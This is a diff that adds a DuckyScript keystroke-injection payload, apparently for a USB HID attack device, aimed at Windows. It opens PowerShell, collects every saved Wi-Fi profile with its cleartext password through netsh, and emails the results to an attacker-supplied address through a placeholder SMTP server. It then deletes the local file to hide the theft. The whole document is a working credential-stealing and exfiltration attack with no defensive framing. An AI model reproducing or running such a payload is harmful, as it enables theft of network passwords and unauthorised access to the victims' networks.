@@ -1,0 +1,40 @@
+WINDOWS d
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd "%USERPROFILE%\Desktop"
+ENTER
+STRING powershell
+ENTER
+STRING if([console]::capslock -eq $true){$wsh = new-object -comobject wscript.shell; $wsh.sendkeys('{capslock}')}
+ENTER
+STRING $profiles = @()
+ENTER
+STRING $profiles += (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+ENTER
+STRING $results = @()
+ENTER
+STRING foreach ($profile in $profiles){
+ENTER
+STRING $profileInfo = netsh wlan show profile name="$profile" key=clear
+ENTER
+STRING $results += "Profile: $profile`n" + ($profileInfo -join "`n")
+ENTER
+STRING $results += "`n"  
+ENTER
+STRING }
+ENTER
+STRING $results | Out-File -FilePath .\wifi_Info.txt -Encoding utf8
+ENTER
+STRING Send-MailMessage -To 'SEND_EMAIL' -From 'YOUR_EMAIL' -Subject "WIFI Info from___" -Body "WifiInfo data is stored in the attachment." -Attachments .\wifi_Info.txt -SmtpServer 'YOUR_SMTP_SERVER'  -Credential $(New-Object System.Management.Automation.PSCredential -ArgumentList 'YOUR_EMAIL', $('STMP_PASSWORD' | ConvertTo-SecureString -AsPlainText -Force)) -UseSsl -Port 587
+ENTER
+DELAY 500
+STRING Remove-Item .\wifi_Info.txt
+ENTER
+STRING exit
+ENTER
+DELAY 2000
+STRING exit
+ENTER
